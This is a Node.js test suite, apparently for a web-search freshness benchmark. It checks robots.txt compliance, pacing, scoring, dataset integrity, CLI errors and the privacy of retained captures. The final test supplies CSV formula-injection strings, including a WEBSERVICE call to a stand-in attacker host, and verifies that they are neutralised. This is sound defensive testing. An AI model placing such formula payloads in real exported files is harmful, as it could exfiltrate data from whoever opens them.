// Copyright (c) Microsoft Corporation.
// Licensed under the MIT license.

import assert from 'node:assert/strict';
import { test } from 'node:test';
import fs from 'node:fs/promises';
import os from 'node:os';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { createHash } from 'node:crypto';
import { spawnSync } from 'node:child_process';
import https from 'node:https';
import dns from 'node:dns/promises';
import { EventEmitter } from 'node:events';
import freshsearch from './freshsearch.cjs';
import {
  main, liveCapture, replaceCaptureFileAtomically, scoreCapture, scoreCaptureForReplay,
  benchmarkSourceHashes, scorerIdentity, summarize, waitForSearchPacing,
} from './run.mjs';
import { describeCliError } from './cli.mjs';
import { hash as traceHash } from './trace.mjs';
const root = path.dirname(fileURLToPath(import.meta.url));
const read = async name => JSON.parse(await fs.readFile(path.join(root, name), 'utf8'));

test('clean smoke refuses invalid runtime metadata before running tests', () => {
  const result = spawnSync(process.execPath, ['-e',
    "Object.defineProperty(process.versions, 'tz', { value: 'unreviewed' }); require('./clean-smoke.cjs');",
  ], { cwd: root, encoding: 'utf8' });
  assert.notEqual(result.status, 0);
  assert.match(result.stderr, /requires Node.*timezone data/u);
});

test('capture replacement retries bounded Windows sharing locks', async () => {
  for (const code of ['EPERM', 'EBUSY', 'EACCES']) {
    const waits = [];
    let attempts = 0;
    await replaceCaptureFileAtomically('capture.pending.json', 'capture.json', {
      platform: 'win32',
      rename: async (pending, destination) => {
        assert.equal(pending, 'capture.pending.json');
        assert.equal(destination, 'capture.json');
        if (++attempts < 3) throw Object.assign(new Error('sharing violation'), { code });
      },
      wait: async delay => waits.push(delay),
    });
    assert.equal(attempts, 3);
    assert.deepEqual(waits, [10, 20]);
  }
});

test('capture replacement preserves non-sharing and exhausted failures', async () => {
  const unrelated = Object.assign(new Error('missing file'), { code: 'ENOENT' });
  await assert.rejects(replaceCaptureFileAtomically('pending', 'destination', {
    platform: 'win32', rename: async () => { throw unrelated; },
    wait: async () => assert.fail('unrelated errors must not wait'),
  }), error => error === unrelated);
  const locked = Object.assign(new Error('persistent sharing violation'), { code: 'EPERM' });
  const waits = [];
  let attempts = 0;
  await assert.rejects(replaceCaptureFileAtomically('pending', 'destination', {
    platform: 'win32', rename: async () => { attempts++; throw locked; },
    wait: async delay => waits.push(delay),
  }), error => error === locked);
  assert.equal(attempts, 6);
  assert.deepEqual(waits, [10, 20, 40, 80, 160]);
});

test('search pacing waits only after a prior dispatch and validates the bound', async () => {
  const calls = [];
  await waitForSearchPacing(0, 1500, { wait: async (...args) => calls.push(args) });
  await waitForSearchPacing(1, 1500, { wait: async (...args) => calls.push(args) });
  assert.deepEqual(calls, [[1500, undefined, { signal: undefined }]]);
  await assert.rejects(waitForSearchPacing(1, 60001), /search-delay-ms/);
});

test('publisher reference honors its robots product token and wildcard fallback', async t => {
  const catalog = await read('datasets/current-launch-fcd96.json');
  const contract = { ...catalog.sources[0].contract,
    accessPolicyVersion: 'freshsearch-fcd-access-policy-v1',
    sourceAccessMode: 'just-in-time-source-access-v1' };
  let rules = '';
  const requests = [];
  t.mock.method(dns, 'lookup', async () => [{ address: '93.184.216.34', family: 4 }]);
  t.mock.method(https, 'request', (url, options, callback) => {
    requests.push({ url: String(url), userAgent: options.headers['User-Agent'],
      cacheControl: options.headers['Cache-Control'] });
    const request = new EventEmitter();
    request.end = () => queueMicrotask(() => {
      const response = new EventEmitter();
      response.statusCode = 200;
      response.headers = { 'content-type': 'text/plain' };
      response.destroy = () => {};
      callback(response);
      response.emit('data', Buffer.from(rules));
      response.emit('end');
    });
    return request;
  });
  for (const agent of ['FreshSearchBenchmark', '*']) {
    rules = `User-agent: ${agent}\nDisallow: /\n`;
    requests.length = 0;
    const result = await freshsearch.captureKnownItemReference({
      contract, signal: new AbortController().signal, logger: { warn() {} },
    });
    assert.equal(result.eligible, false);
    assert.equal(result.reason, 'source-access-policy-crawl-denied');
    assert.ok(requests.length > 0);
    assert.ok(requests.every(request => request.url.endsWith('/robots.txt') &&
      request.userAgent === 'FreshSearchBenchmark/1.0 (+https://github.com/microsoft/grounding-evals)' &&
      request.cacheControl === 'no-cache, no-store'));
  }
  rules = 'User-agent: FreshSearchBenchmark\nAllow: /\nUser-agent: Googlebot\nDisallow: /\n';
  requests.length = 0;
  const allowed = await freshsearch.captureKnownItemReference({
    contract, signal: new AbortController().signal, logger: { warn() {} },
  });
  assert.ok(requests.some(request => request.url === contract.reference.feedUrl));
  assert.ok(requests.every(request => request.cacheControl === 'no-cache, no-store'));
  assert.notEqual(allowed.reason, 'source-access-policy-crawl-denied');
  assert.notEqual(allowed.reason, 'source-access-policy-pacing-unverified');
  rules = 'User-agent: FreshSearchBenchmark\nAllow: /\nCrawl-delay: invalid\n';
  requests.length = 0;
  const malformed = await freshsearch.captureKnownItemReference({
    contract, signal: new AbortController().signal, logger: { warn() {} },
  });
  assert.equal(malformed.reason, 'source-access-policy-pacing-unverified');
  rules = 'User-agent: FreshSearchBenchmark\nSitemap: https://example.com/sitemap.xml\n' +
    'User-agent: Googlebot\nCrawl-delay: invalid\n';
  requests.length = 0;
  const separated = await freshsearch.captureKnownItemReference({
    contract, signal: new AbortController().signal, logger: { warn() {} },
  });
  assert.notEqual(separated.reason, 'source-access-policy-pacing-unverified');
  assert.ok(requests.some(request => request.url === contract.reference.feedUrl));
  rules = 'User-agent: *\nDisallow: /\n';
  for (const host of ['npr.org', 'aljazeera.com', 'latimes.com', 'wired.com']) {
    requests.length = 0;
    const outlet = { ...contract, publisherId: host, reference: { ...contract.reference,
      feedUrl: `https://${host}/feed`, feedHosts: [host], articleHosts: [host] } };
    const result = await freshsearch.captureKnownItemReference({
      contract: outlet, signal: new AbortController().signal, logger: { warn() {} },
    });
    assert.equal(result.reason, 'source-access-policy-crawl-denied');
    assert.ok(requests.some(request => request.url === `https://${host}/robots.txt`));
  }
});

test('feed access proof validates without a publisher suppression pin', () => {
  const observedAt = '2026-10-14T12:55:00.000Z';
  const publishedAt = '2026-10-14T12:00:00.000Z';
  const host = 'example.com';
  const feedUrl = `https://${host}/feed`;
  const robotsUrl = `https://${host}/robots.txt`;
  const targets = Array.from({ length: 10 }, (_, index) => {
    const url = `https://${host}/article-${index + 1}`;
    return { rank: index + 1, url, aliases: [url], title: `Article number ${index + 1}`, publishedAt };
  });
  const feedBody = `<rss version="2.0"><channel><title>Example</title><link>https://${host}/</link>` +
    targets.map(target => `<item><title>${target.title}</title><link>${target.url}</link>` +
      '<pubDate>Wed, 14 Oct 2026 12:00:00 GMT</pubDate></item>').join('') + '</channel></rss>';
  const documents = [
    { role: 'feed', url: feedUrl, body: feedBody },
    { role: 'robots', url: robotsUrl, body: 'User-agent: *\nAllow: /\n' },
  ].map(document => ({ ...document, observedAt, contentType: 'text/plain',
    decodedBodySha256: createHash('sha256').update(document.body).digest('hex') }));
  const receipts = documents.map(document => ({ url: document.url, finalUrl: document.url,
    observedAt, decodedBodySha256: document.decodedBodySha256, status: 200, bodyComplete: true,
    userAgent: 'FreshSearchBenchmark/1.0 (+https://github.com/microsoft/grounding-evals)', xRobotsTag: [] }));
  const contract = { queryId: 'offline-feed', sourceAccessMode: 'just-in-time-source-access-v1',
    accessPolicyVersion: 'freshsearch-fcd-feed-access-policy-v1',
    reference: { feedUrl, listingUrls: [], feedHosts: [host], articleHosts: [host] } };
  const reference = { eligible: true, observedAt, excludedItems: 0, targets,
    evidence: [...documents, { role: 'http-receipts', receipts }] };
  const proof = freshsearch.createJustInTimeAccessProof(contract, reference,
    { batchId: 'batch', itemId: contract.queryId, generation: 0, manifestHash: 'manifest' });
  assert.ok(proof);
  assert.equal(proof.policyVersion, contract.accessPolicyVersion);
  assert.ok(!Object.hasOwn(proof, 'suppressionVersion'));
  const restricted = agent => {
    const changed = structuredClone(reference);
    changed.evidence.find(row => row.role === 'http-receipts').receipts.push({
      ...receipts[0], url: targets[0].url, xRobotsTag: [`${agent}: noindex`],
    });
    return freshsearch.createJustInTimeAccessProof(contract, changed,
      { batchId: 'batch', itemId: contract.queryId, generation: 0, manifestHash: 'manifest' });
  };
  assert.ok(restricted('Googlebot'));
  assert.equal(restricted('FreshSearchBenchmark'), null);
  assert.equal(restricted('robots'), null);
});

test('article robots metadata applies only to the benchmark crawler and generic rules', async t => {
  const contract = { ...(await read('datasets/current-launch-fcd96.json')).sources[0].contract,
    accessPolicyVersion: 'freshsearch-fcd-feed-access-policy-v1',
    sourceAccessMode: 'just-in-time-source-access-v1' };
  const host = contract.reference.articleHosts[0];
  const feed = `<rss version="2.0"><channel><title>Fixture</title>` +
    Array.from({ length: 10 }, (_, index) =>
      `<item><title>Article number ${index + 1}</title><link>https://${host}/article-${index + 1}</link>` +
      `<pubDate>${new Date(Date.now() - 60000).toUTCString()}</pubDate></item>`).join('') + '</channel></rss>';
  let agent = 'Googlebot';
  let header = null;
  let headerTarget = 'all';
  t.mock.method(dns, 'lookup', async () => [{ address: '93.184.216.34', family: 4 }]);
  t.mock.method(https, 'request', (url, options, callback) => {
    const request = new EventEmitter();
    request.end = () => queueMicrotask(() => {
      const response = new EventEmitter();
      const robots = String(url).endsWith('/robots.txt');
      const isFeed = String(url) === contract.reference.feedUrl;
      response.statusCode = 200;
      response.headers = { 'content-type': robots ? 'text/plain' : isFeed ? 'application/rss+xml' : 'text/html' };
      if (!robots && header && (headerTarget === 'all' || !isFeed)) response.headers['x-robots-tag'] = header;
      response.destroy = () => {};
      callback(response);
      response.emit('data', Buffer.from(robots ? 'User-agent: *\nAllow: /\n' : isFeed ? feed :
        `<html><head><meta name="${agent}" content="noindex"></head><body>Article</body></html>`));
      response.emit('end');
    });
    return request;
  });
  for (const [name, restricted] of [['Googlebot', false], ['FreshSearchBenchmark', true], ['robots', true]]) {
    agent = name;
    const result = await freshsearch.captureKnownItemReference({
      contract, signal: new AbortController().signal, logger: { warn() {} },
    });
    assert.equal(result.reason === 'source-page-robots-restriction', restricted, name);
    assert.ok(result.evidence.some(row => row.role === 'article-access-policy'), `${name}: ${result.reason}`);
  }
  agent = 'Googlebot';
  const anchored = { ...contract, accessPolicyVersion: 'freshsearch-fcd-access-policy-v1',
    sourceAccessMode: 'feed-anchored-source-access-v1' };
  for (const [value, eligible] of [['Googlebot: noindex', true], ['FreshSearchBenchmark: noindex', false],
    ['noindex', false]]) {
    header = value;
    const result = await freshsearch.captureKnownItemReference({
      contract: anchored, signal: new AbortController().signal, logger: { warn() {} },
    });
    assert.equal(result.eligible, eligible, value);
    if (eligible) assert.ok(freshsearch.createJustInTimeAccessProof(anchored, result,
      { batchId: 'batch', itemId: anchored.queryId, generation: 0, manifestHash: 'manifest' }));
    else assert.equal(result.reason, 'feed-anchored-feed-policy-unverified', value);
  }
  headerTarget = 'article';
  header = 'FreshSearchBenchmark: noindex';
  const restrictedArticle = await freshsearch.captureKnownItemReference({
    contract: anchored, signal: new AbortController().signal, logger: { warn() {} },
  });
  assert.equal(restrictedArticle.reason, 'source-page-robots-restriction');
});

function mockFeedPublisher(t, source, publisherMarker) {
  const host = source.contract.reference.articleHosts[0];
  const feed = `<rss version="2.0"><channel><title>${publisherMarker}</title>` +
    Array.from({ length: 10 }, (_, index) =>
      `<item><title>${publisherMarker} article ${index + 1}</title>` +
      `<link>https://${host}/private-article-${index + 1}</link>` +
      `<pubDate>${new Date(Date.now() - 60000).toUTCString()}</pubDate></item>`).join('') + '</channel></rss>';
  t.mock.method(dns, 'lookup', async () => [{ address: '93.184.216.34', family: 4 }]);
  t.mock.method(https, 'request', (url, options, callback) => {
    const request = new EventEmitter();
    request.end = () => queueMicrotask(() => {
      const response = new EventEmitter();
      const robots = String(url).endsWith('/robots.txt');
      const isFeed = String(url) === source.contract.reference.feedUrl;
      response.statusCode = 200;
      response.headers = { 'content-type': robots ? 'text/plain' : isFeed ? 'application/rss+xml' : 'text/html' };
      response.destroy = () => {};
      callback(response);
      response.emit('data', Buffer.from(robots ? 'User-agent: *\nAllow: /\n' : isFeed ? feed :
        `<html><head><meta property="og:type" content="article"></head><body>${publisherMarker}</body></html>`));
      response.emit('end');
    });
    return request;
  });
}

test('live FCD retains scores but not publisher or provider content', async t => {
  const temporary = await fs.mkdtemp(path.join(os.tmpdir(), 'freshsearch-fcd-private-'));
  t.after(() => fs.rm(temporary, { recursive: true, force: true }));
  const source = (await read('datasets/current-launch-fcd96.json')).sources[0];
  const host = source.contract.reference.articleHosts[0];
  const publisherMarker = 'UNIQUE_PUBLISHER_TITLE_NOT_RETAINED';
  const providerMarker = 'UNIQUE_PROVIDER_RESPONSE_NOT_RETAINED';
  mockFeedPublisher(t, source, publisherMarker);
  const reference = await freshsearch.captureKnownItemReference({
    contract: { ...source.contract, accessPolicyVersion: 'freshsearch-fcd-access-policy-v1',
      sourceAccessMode: 'just-in-time-source-access-v1' },
    signal: new AbortController().signal, logger: { warn() {} },
  });
  assert.equal(reference.eligible, true, reference.reason);
  const adapter = path.join(temporary, 'provider.mjs');
  await fs.writeFile(adapter, `export const providerId = 'offline-provider';\n` +
    'export const physicalRetries = 0;\n' +
    `export async function search() { return [{ url: 'https://provider.example/private', content: '${providerMarker}' }]; }\n`);
  const out = path.join(temporary, 'run');
  const report = await main(['--live', '--confirm-authorized-use', '--panel', 'fcd',
    '--provider', adapter, '--feed-id', source.sourceId, '--max-calls', '10', '--out', out]);
  assert.equal(report.retention, 'metadata-only-not-replayable');
  assert.equal(report.summary[0].eligibleTargets, 10);
  assert.equal(report.summary[0].score, 0);
  const checkpoint = JSON.parse(await fs.readFile(path.join(out, 'checkpoint.json'), 'utf8'));
  assert.equal(checkpoint.execution.reserved.search, 10);
  for (const name of await fs.readdir(out)) {
    const saved = await fs.readFile(path.join(out, name), 'utf8');
    for (const privateValue of [publisherMarker, providerMarker, source.contract.reference.feedUrl,
      'https://provider.example/private', `https://${host}/private-article-1`]) {
      assert.ok(!saved.includes(privateValue), `${name} retained private content`);
    }
  }
});

test('live FCD records a response-body reset as an unavailable target and continues capture', async t => {
  const temporary = await fs.mkdtemp(path.join(os.tmpdir(), 'freshsearch-fcd-body-reset-'));
  t.after(() => fs.rm(temporary, { recursive: true, force: true }));
  const source = (await read('datasets/current-launch-fcd96.json')).sources[0];
  mockFeedPublisher(t, source, 'UNIQUE_PUBLISHER_TITLE_NOT_RETAINED');
  const previous = process.env.BODY_RESET_TEST_KEY;
  process.env.BODY_RESET_TEST_KEY = 'offline-body-reset-key';
  t.after(() => { if (previous === undefined) delete process.env.BODY_RESET_TEST_KEY; else process.env.BODY_RESET_TEST_KEY = previous; });
  let searches = 0;
  t.mock.method(globalThis, 'fetch', async () => {
    searches++;
    if (searches > 1) return Response.json({ results: [] });
    return new Response(new ReadableStream({ start(controller) {
      controller.enqueue(new TextEncoder().encode('{"results":['));
      controller.error(Object.assign(new Error('socket hang up'), { code: 'ECONNRESET' }));
    } }));
  });
  const adapter = path.join(temporary, 'provider.mjs');
  await fs.writeFile(adapter, `import { request } from ${JSON.stringify(new URL('./providers/shared.mjs', import.meta.url).href)};\n` +
    "export const providerId = 'offline-provider';\nexport const physicalRetries = 0;\n" +
    "export async function search({ query, signal }) {\n  await request({ providerId, endpoint: 'https://search.example/v1', " +
    "keyEnv: 'BODY_RESET_TEST_KEY', authHeader: 'x-api-key', body: { query }, signal });\n  return [];\n}\n");
  const out = path.join(temporary, 'run');
  const report = await main(['--live', '--confirm-authorized-use', '--panel', 'fcd',
    '--provider', adapter, '--feed-id', source.sourceId, '--max-calls', '10', '--out', out]);
  assert.equal(searches, 10);
  assert.equal(report.summary[0].eligibleTargets, 10);
  const checkpoint = JSON.parse(await fs.readFile(path.join(out, 'checkpoint.json'), 'utf8'));
  assert.equal(checkpoint.execution.reserved.search, 10);
  assert.equal(checkpoint.execution.reservations.filter(row => row.status === 'unknown').length, 1);
});
test('EF reuses original FreshSearch scoring: 100, 50, 100, missing=0, held=null', async () => {
  const input = await read('examples/ef.json');
  const result = scoreCapture(input, 'ef');
  assert.deepEqual(result.rows.map(row => row.score), [100, 50, 100, 0, null]);
  for (const [index, record] of input.records.entries()) {
    assert.deepEqual(result.rows[index].details, freshsearch.scoreFreshnessRun(record, freshsearch.DEFAULT_FRESH_SEARCH_POLICY));
  }
  assert.equal(summarize(result, 'ef')[0].score, 62.5);
});
test('legacy EF captures cannot be presented as live or retained scoring', async () => {
  const input = await read('examples/ef.json');
  for (const kind of ['retained-capture', 'live-capture']) {
    assert.throws(() => scoreCapture({ ...input, kind }, 'ef'), /historical captures require their original scorer/);
    await assert.rejects(scoreCaptureForReplay({ ...input, kind }, 'ef'), /Historical captures require their original scorer/);
  }
});
test('retained FCD replay requires matching scorer sources and a bound reference', async () => {
  const sourceHashes = await benchmarkSourceHashes();
  const source = await scorerIdentity(sourceHashes['freshsearch.cjs']);
  const contract = { queryId: 'offline-feed' };
  const reference = { eligible: false, observedAt: '2026-10-14T12:55:00.000Z' };
  const shared = { contract, contractHash: traceHash(contract), reference, proof: null };
  const input = {
    version: 'freshsearch-fcd-capture-v1', panel: 'fcd', kind: 'retained-capture',
    episodes: [{ id: contract.queryId, providerId: 'fixture', eligible: false,
      reason: 'source-policy-hold', reference, referenceAsOf: reference.observedAt }],
    execution: { source, sourceHashes, fcdReference: shared, fcdReferenceHash: traceHash(shared) },
  };
  const scored = await scoreCaptureForReplay(input, 'fcd');
  assert.equal(scored.rows[0].status, 'held');
  const changedSource = structuredClone(input);
  changedSource.execution.sourceHashes['run.mjs'] = '0'.repeat(64);
  await assert.rejects(scoreCaptureForReplay(changedSource, 'fcd'), /Capture source differs/);
  const changedReference = structuredClone(input);
  changedReference.execution.fcdReference.reference.eligible = true;
  await assert.rejects(scoreCaptureForReplay(changedReference, 'fcd'), /shared-reference binding mismatch/);
  assert.throws(() => scoreCapture(input, 'fcd'), /source-bound replay/);
});
test('FCD age boundaries and unknowns preserve exact denominator', async () => {
  const input = await read('examples/fcd.json');
  const result = scoreCapture(input, 'fcd');
  const summary = summarize(result, 'fcd')[0];
  assert.equal(summary.scoredRows, 9);
  assert.equal(summary.unknownRows, 1);
  assert.equal(summary.heldRows, 1);
  assert.equal(summary.assignedTargets, 20);
  assert.equal(summary.coverage, 9 / 20);
  assert.equal(summary.earnedPoints, 51);
  assert.equal(summary.possiblePoints, 93);
  assert.equal(summary.score, 100 * 51 / 93);
  assert.deepEqual([29.99, 30, 60, 360, 1440].map(freshsearch.freshRetrievalAgePoints), [15, 10, 5, 2, 1]);
});
test('malformed captures, duplicate targets and future clocks fail explicitly', async () => {
  const source = await read('examples/fcd.json');
  const bad = structuredClone(source);
  bad.episodes[0].targets[0].publishedAt = '2027-01-01T00:00:00Z';
  assert.throws(() => scoreCapture(bad, 'fcd'), /publication cannot/);
  const duplicate = structuredClone(source);
  duplicate.episodes[0].targets[1] = { ...duplicate.episodes[0].targets[0], rank: 2 };
  assert.throws(() => scoreCapture(duplicate, 'fcd'), /Duplicate|colliding/);
  const unscored = structuredClone(source);
  unscored.episodes[0].targets[0].status = undefined;
  assert.throws(() => scoreCapture(unscored, 'fcd'), /capture status/);
});
test('bundle and canonical dataset hashes bind FreshSearch main', async () => {
  const manifest = await read('build-manifest.json');
  const hash = createHash('sha256').update(await fs.readFile(path.join(root, 'freshsearch.cjs'))).digest('hex');
  assert.equal(hash, manifest.outputSha256);
  const datasets = await read('datasets/manifest.json');
  assert.equal(datasets.currentLaunch.version, 'freshsearch-launch-dataset-v1');
  assert.equal(datasets.profile.version, 'freshsearch-combined-profile-v1');
  assert.deepEqual(datasets.panelWeights, { evidenceFreshness: 0.2, freshContentDiscovery: 0.8 });
  assert.equal(datasets.correctnessDefault, false);
  for (const name of ['current-launch-fcd96.json', 'current-launch-ef120.json']) {
    assert.equal(datasets[name].releaseStatus, 'public');
    assert.equal(createHash('sha256').update(await fs.readFile(path.join(root, 'datasets', name))).digest('hex'),
      datasets[name].sha256);
  }
});
test('standalone exports complete native EF120 identities in finance-first order, not evergreen candidates', async () => {
  assert.deepEqual((await fs.readdir(path.join(root, 'datasets'))).sort(),
    ['current-launch-ef120.json', 'current-launch-fcd96.json', 'manifest.json']);
  const dataset = await read('datasets/current-launch-ef120.json');
  const { tasks, taskCases, queryIds } = dataset;
  assert.equal(tasks.length, 120);
  assert.equal(new Set(tasks.map(task => task.queryId)).size, 120);
  assert.deepEqual(tasks.map(task => task.queryId), queryIds);
  assert.deepEqual(tasks, taskCases.map(task => task.freshSearch));
  assert.ok(taskCases.every(task => task.id && task.sourceEvalId));
  const hashes = (await read('datasets/manifest.json')).profile.evidenceFreshness;
  const digest = value => createHash('sha256').update(JSON.stringify(value)).digest('hex');
  for (const [field, value] of [
    ['queryIdMembershipSha256', [...queryIds].sort()],
    ['queryIdOrderSha256', queryIds],
    ['taskCaseIdsSha256', taskCases.map(task => task.id)],
  ]) {
    assert.equal(digest(value), hashes[field]);
    assert.equal(dataset[field], hashes[field]);
  }
  assert.ok(tasks.slice(0, 60).every(task => task.category === 'finance'));
  assert.ok(tasks.slice(60).every(task => task.category === 'weather'));
  for (const category of ['finance', 'weather']) {
    for (const tier of ['head', 'torso', 'tail']) {
      assert.equal(tasks.filter(task => task.category === category && task.tier === tier).length, 20);
    }
  }
  for (const task of tasks) assert.equal(freshsearch.parseFreshSearchTaskContract(task).panel, 'freshness');
  assert.equal('buildEvergreenCohortCandidates' in freshsearch, false);
  assert.equal('cohortCandidateTaskCase' in freshsearch, false);
  const bundle = await fs.readFile(path.join(root, 'freshsearch.cjs'), 'utf8');
  assert.doesNotMatch(bundle, /freshSearchCohortInventory\.json|freshSearchTrafficActivationConfigV3\.json/);
});
test('FCD96 preserves ordered FCD identities, contracts and sampling metadata after all four exclusions', async () => {
  const fcd = await read('datasets/current-launch-fcd96.json');
  assert.equal(fcd.sources.length, 96);
  assert.equal(new Set(fcd.sources.map(source => source.sourceId)).size, 96);
  assert.equal(new Set(fcd.sources.map(source => source.contract.reference.feedUrl)).size, 96);
  assert.deepEqual(fcd.sources.map(source => source.sourceId), fcd.membership.sourceIds);
  assert.equal(fcd.exclusions.excludedFeedUrls.length, 4);
  for (const source of fcd.sources) {
    assert.equal(source.sourceId, source.contract.queryId);
    assert.equal(source.contract.releaseId, 'freshsearch-fcd-catalog-v1');
    assert.ok(source.samplingMetadata.publisherFamily && source.samplingMetadata.topics.length && source.rubric);
    assert.ok(!fcd.exclusions.excludedFeedUrls.includes(source.contract.reference.feedUrl));
  }
});
test('default EF120 cannot silently expand a small live budget, and FCD rejects excluded feeds before collection', async t => {
  const previous = process.env.FRESHSEARCH_JUDGE_API_KEY;
  process.env.FRESHSEARCH_JUDGE_API_KEY = 'offline-preflight-only';
  t.after(() => {
    if (previous === undefined) delete process.env.FRESHSEARCH_JUDGE_API_KEY;
    else process.env.FRESHSEARCH_JUDGE_API_KEY = previous;
  });
  const save = () => assert.fail('Budget and membership rejection must precede collection or checkpoints');
  const directory = await fs.mkdtemp(path.join(os.tmpdir(), 'freshsearch-judge-'));
  t.after(() => fs.rm(directory, { recursive: true, force: true }));
  const judgeFile = path.join(directory, 'judge.json');
  await fs.writeFile(judgeFile, JSON.stringify({ ...(await read('examples/judge-config.json')),
    endpoint: 'https://judge.example.com/v1/chat/completions', model: 'test-model' }));
  const values = { provider: path.join(root, 'examples/provider.mjs'), 'max-calls': '1',
    'confirm-authorized-use': true,
    'max-judge-calls': '2', 'judge-config': judgeFile };
  await assert.rejects(liveCapture({ ...values, panel: 'ef' }, save), /insufficient call budget/);
  await assert.rejects(liveCapture({ ...values, panel: 'fcd', 'feed-id': 'not-in-current-launch' }, save),
    /FCD feed catalog/);
});
test('current clock diagnostics survive parsing and original scoring without changing legacy points', async () => {
  const source = await read('examples/ef.json');
  source.records = [source.records.find(record => record.queryId === 'timestamp-missing')];
  source.records[0].evidence[0].clockFailureCategory = 'relative_clock_requires_crawl_timestamp';
  source.records[0].evidence[0].clockDecision = 'unresolved';
  const result = scoreCapture(source, 'ef');
  assert.equal(result.rows[0].score, 0);
  assert.equal(result.rows[0].details.evidenceScores[0].failureCategory, 'relative_clock_requires_crawl_timestamp');
});
test('CLI writes complete reports, inspectable issues, and refuses overwrite', async t => {
  const temporary = await fs.mkdtemp(path.join(os.tmpdir(), 'freshsearch-portable-test-'));
  t.after(() => fs.rm(temporary, { recursive: true, force: true }));
  const out = path.join(temporary, 'ef');
  const report = await main(['--panel', 'ef', '--input', path.join(root, 'examples', 'ef.json'), '--out', out]);
  assert.equal(report.kind, 'synthetic-fixture');
  for (const name of ['capture.json', 'results.json', 'cases.csv', 'issues.csv']) {
    assert.ok((await fs.stat(path.join(out, name))).size > 0);
  }
  const issues = await fs.readFile(path.join(out, 'issues.csv'), 'utf8');
  assert.match(issues, /timestamp-missing/);
  assert.match(issues, /reference-held/);
  await assert.rejects(main(['--panel', 'ef', '--input', path.join(root, 'examples', 'ef.json'), '--out', out]), /EEXIST/);
});
test('live mode fails before provider dispatch without explicit adapter/budget', async t => {
  const temporary = await fs.mkdtemp(path.join(os.tmpdir(), 'freshsearch-live-guard-'));
  t.after(() => fs.rm(temporary, { recursive: true, force: true }));
  const out = path.join(temporary, 'run');
  await assert.rejects(main(['--panel', 'fcd', '--live', '--confirm-authorized-use', '--out', out]), /requires --provider/);
  const failure = JSON.parse(await fs.readFile(path.join(out, 'failure.json'), 'utf8'));
  assert.equal(failure.status, 'failed');
  await assert.rejects(fs.stat(path.join(out, 'results.json')), /ENOENT/);
});
test('CLI explains help, missing inputs and existing outputs without creating a folder', async t => {
  const temporary = await fs.mkdtemp(path.join(os.tmpdir(), 'freshsearch-cli-'));
  t.after(() => fs.rm(temporary, { recursive: true, force: true }));
  const cli = args => spawnSync(process.execPath, [path.join(root, 'run.mjs'), ...args], { encoding: 'utf8' });
  const help = cli(['--help']);
  assert.equal(help.status, 0, help.stderr);
  assert.match(help.stdout, /--max-judge-calls/);
  const smokeHelp = spawnSync(process.execPath, [path.join(root, 'clean-smoke.cjs'), '--help'], { encoding: 'utf8' });
  assert.equal(smokeHelp.status, 0);
  assert.match(smokeHelp.stdout, /Usage:/);
  assert.equal(smokeHelp.stderr, '');
  const out = path.join(temporary, 'run');
  const missing = cli(['--panel', 'fcd', '--input', path.join(temporary, 'missing.json'), '--out', out]);
  assert.equal(missing.status, 1);
  assert.match(missing.stderr, /File or folder not found: .*missing\.json/);
  await assert.rejects(fs.stat(out), /ENOENT/);
  const invalid = cli(['--panel', 'ef', '--input', path.join(root, 'examples', 'ef-tasks.json'), '--out', out]);
  assert.equal(invalid.status, 1);
  assert.match(invalid.stderr, /Input must be a capture/);
  await assert.rejects(fs.stat(out), /ENOENT/);
  const invalidLive = cli(['--panel', 'ef', '--live', '--confirm-authorized-use', '--input', path.join(root, 'examples', 'fcd.json'),
    '--max-calls', '1', '--out', out]);
  assert.equal(invalidLive.status, 1);
  assert.match(invalidLive.stderr, /Invalid EF tasks/);
  await assert.rejects(fs.stat(out), /ENOENT/);
  const existing = cli(['--panel', 'ef', '--input', path.join(root, 'examples', 'ef.json'), '--out', temporary]);
  assert.equal(existing.status, 1);
  assert.match(existing.stderr, /Output already exists: .*\nChoose a new --out path/);
  assert.match(describeCliError(Object.assign(new Error("Unknown option '--bogus'"),
    { code: 'ERR_PARSE_ARGS_UNKNOWN_OPTION' })), /Run with --help for usage/);
});
test('untrusted CSV text cannot become a spreadsheet formula; JSON remains exact', async t => {
  const temporary = await fs.mkdtemp(path.join(os.tmpdir(), 'freshsearch-csv-guard-'));
  t.after(() => fs.rm(temporary, { recursive: true, force: true }));
  const reasons = ['=WEBSERVICE("https://attacker.invalid")', '\t =1+1', '+1+1', '-1+1', '@SUM(A1)', '\u200b=1'];
  const input = { version: 'freshsearch-portable-input-v1', panel: 'fcd', kind: 'synthetic-fixture',
    episodes: reasons.map((reason, index) => ({ id: `held-${index}`, providerId: 'fixture', eligible: false, reason })) };
  const filename = path.join(temporary, 'input.json');
  await fs.writeFile(filename, JSON.stringify(input));
  const out = path.join(temporary, 'output');
  const report = await main(['--panel', 'fcd', '--input', filename, '--out', out]);
  assert.deepEqual(report.cases.map(row => row.reason), reasons);
  const csv = await fs.readFile(path.join(out, 'cases.csv'), 'utf8');
  for (const reason of reasons) assert.ok(csv.includes(`"'${reason.replaceAll('"', '""')}"`));
});
